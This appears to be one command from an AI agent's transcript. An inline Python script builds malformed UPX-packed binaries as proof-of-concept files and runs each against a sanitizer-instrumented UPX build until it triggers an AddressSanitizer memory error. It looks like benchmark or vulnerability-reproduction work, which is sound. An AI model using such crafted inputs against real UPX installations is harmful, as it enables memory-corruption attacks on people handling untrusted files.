Running command: cd /workspace && python3 - <<'PY'
import pathlib,struct,subprocess
seed=bytearray(pathlib.Path('hello.upx').read_bytes())
binfo=256; dataoff=268; orig_clen=262; orig_final=5416
for n in [24,32,48,52,56,60,63,64,80,128,232,568,792]:
 comp=pathlib.Path(f'/tmp/out{n}').read_bytes()
 p=bytearray(seed)
 p[dataoff:dataoff+orig_clen]=comp
 delta=len(comp)-orig_clen
 final=orig_final+delta
 struct.pack_into('<I',p,binfo,n); struct.pack_into('<I',p,binfo+4,len(comp))
 # patch final pack header c_len at +20 to final offset, checksum at +31
 struct.pack_into('<I',p,final+20,final)
 p[final+31]=0
 p[final+31]=sum(p[final+4:final+31])%251
 # overlay follows at +32 stays shifted and should be original 236; verify
 fn=f'/tmp/poc3_n{n}.bin'; pathlib.Path(fn).write_bytes(p)
 r=subprocess.run(['/workspace/repo-vul/src-vul/asanbuild/upx','-t',fn],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=10)
 out=r.stdout.decode('latin1','replace')
 print('\nN',n,'clen',len(comp),'final',final,'len',len(p),'overlay',struct.unpack_from('<I',p,final+32)[0],'rc',r.returncode,'asan',('ERROR: AddressSanitizer'in out))
 print('\n'.join(out.splitlines()[-12:]))
 if 'ERROR: AddressSanitizer' in out:
  print(out[:7000]); break
PY
